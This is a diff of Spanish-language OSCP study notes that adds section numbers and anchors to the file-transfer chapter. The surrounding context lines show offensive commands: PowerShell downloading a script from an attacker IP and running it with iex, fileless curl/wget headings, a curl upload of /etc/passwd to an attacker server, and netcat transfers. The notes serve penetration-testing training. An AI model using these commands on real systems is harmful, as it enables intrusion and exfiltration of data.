@@ -113,11 +113,23 @@ Apuntes para la certificación OSCP.
     * 7.8. [pypykatz](#pypykatz)
 * 8. [Transferencia de Archivos](#transferencia-de-archivos)
     * 8.1. [Windows](#windows-1)
+        * 8.1.1. [Operaciones de Descarga](#operaciones-de-descarga)
+        * 8.1.2. [SMB](#smb)
+        * 8.1.3. [FTP](#ftp)
+        * 8.1.4. [Operaciones de Subida](#operaciones-de-subida)
     * 8.2. [Linux](#linux-1)
+        * 8.2.1. [Operaciones de Descarga](#operaciones-de-descarga-1)
+        * 8.2.2. [Ataques sin archivos usando Linux](#ataques-sin-archivos-usando-linux)
+        * 8.2.3. [Descargar con Bash (/dev/tcp)](#descargar-con-bash-(/dev/tcp))
+        * 8.2.4. [Descargas SSH](#descargas-ssh)
+        * 8.2.5. [Web Upload](#web-upload)
+        * 8.2.6. [Netcat](#netcat)
+        * 8.2.7. [Método alternativo de transferencia de archivos web](#método-alternativo-de-transferencia-de-archivos-web)
+        * 8.2.8. [Operaciones de Subida](#operaciones-de-subida-1)
 * 9. [Movimiento Lateral](#movimiento-lateral)
     * 9.1. [RDP](#rdp)
         * 9.1.1. [xfreerdp](#xfreerdp-1)
-    * 9.2. [SMB](#smb)
+    * 9.2. [SMB](#smb-1)
         * 9.2.1. [PsExec](#psexec)
         * 9.2.2. [SharpNoPSExec](#sharpnopsexec)
         * 9.2.3. [NimExec](#nimexec)
@@ -1605,7 +1617,7 @@ pypykatz registry --sam sam system
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Windows.
 
-#### Operaciones de Descarga
+####  8.1.1. <a name='operaciones-de-descarga'></a>Operaciones de Descarga
 
 ##### Codificación y Decodificación PowerShell Base64
 
@@ -1705,7 +1717,7 @@ iex (Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1)
 Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1 | iex
 ```
 
-#### SMB
+####  8.1.2. <a name='smb'></a>SMB
 
 ##### Máquina atacante
 
@@ -1732,7 +1744,7 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare -user kali -password ka
 net use n: \\192.168.1.19\share /user:kali kali
 ```
 
-#### FTP
+####  8.1.3. <a name='ftp'></a>FTP
 
 Otra forma de transferir archivos es mediante FTP (Protocolo de transferencia de archivos), que utiliza los puertos TCP/21 y TCP/20. Podemos utilizar el cliente FTP o PowerShell Net.WebClient para descargar archivos desde un servidor FTP.
 
@@ -1774,7 +1786,7 @@ C:\htb>more file.txt
 This is a test file
 ```
 
-#### Operaciones de Subida
+####  8.1.4. <a name='operaciones-de-subida'></a>Operaciones de Subida
 
 ##### Codificación y decodificación PowerShell Base64
 
@@ -1841,7 +1853,7 @@ echo <base64> | base64 -d -w 0 > hosts
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Linux.
 
-#### Operaciones de Descarga
+####  8.2.1. <a name='operaciones-de-descarga-1'></a>Operaciones de Descarga
 
 ##### Codificación/Decodificación Base64
 
@@ -1878,7 +1890,7 @@ cURL es muy similar a wget, pero la opción del nombre del archivo de salida es 
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh
 ```
 
-#### Ataques sin archivos usando Linux
+####  8.2.2. <a name='ataques-sin-archivos-usando-linux'></a>Ataques sin archivos usando Linux
 
 ##### Descarga sin archivos con cURL
 
@@ -1892,7 +1904,7 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 Hello World!
 ```
 
-#### Descargar con Bash (/dev/tcp)
+####  8.2.3. <a name='descargar-con-bash-(/dev/tcp)'></a>Descargar con Bash (/dev/tcp)
 
 También puede haber situaciones en las que ninguna de las herramientas de transferencia de archivos más conocidas esté disponible. Siempre que esté instalada la versión `2.04` o superior de Bash (compilada con `--enable-net-redirections`), el archivo de dispositivo integrado /dev/tcp se puede utilizar para descargas de archivos simples.
 
@@ -1924,13 +1936,13 @@ Imprimimos la respuesta
 cat <&3
 ```
 
-#### Descargas SSH
+####  8.2.4. <a name='descargas-ssh'></a>Descargas SSH
 
 ```bash
 scp elliot@192.168.1.19:/root/myroot.txt . 
 ```
 
-#### Web Upload
+####  8.2.5. <a name='web-upload'></a>Web Upload
 
 Podemos usar uploadserver , un módulo extendido de Python HTTP.Server módulo, que incluye una página de carga de archivos. Para este ejemplo de Linux, veamos cómo podemos configurar el `uploadserver` módulo a utilizar HTTPS para una comunicación segura.
 
@@ -1970,7 +1982,7 @@ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/e
 
 Usamos la opción `--insecure` porque utilizamos un certificado autofirmado en el que confiamos.
 
-#### Netcat
+####  8.2.6. <a name='netcat'></a>Netcat
 
 ##### Máquina atacante
 
@@ -1984,7 +1996,7 @@ nc -l -p 4444 > output.txt
 nc -w 3 192.168.1.10 4444 < output.txt
 ```
 
-#### Método alternativo de transferencia de archivos web
+####  8.2.7. <a name='método-alternativo-de-transferencia-de-archivos-web'></a>Método alternativo de transferencia de archivos web
 
 ##### Creación de un servidor web con Python3
 
@@ -2017,7 +2029,7 @@ php -S 0.0.0.0:8000
 wget 192.168.1.19:8000/filetotransfer.txt
 ```
 
-#### Operaciones de Subida
+####  8.2.8. <a name='operaciones-de-subida-1'></a>Operaciones de Subida
 
 ##### SCP
 
@@ -2046,7 +2058,7 @@ Parámetros:
 - `/auto-reconnect`: Se vuelve a conectar automáticamente si la conexión se interrumpe, lo que mejora la estabilidad de la sesión.
 - `-glyph-cache`: permite el almacenamiento en caché de glifos (caracteres de texto) para reducir la cantidad de datos enviados para la representación de texto.
 
-###  9.2. <a name='smb'></a>SMB
+###  9.2. <a name='smb-1'></a>SMB
 
 ####  9.2.1. <a name='psexec'></a>PsExec
 
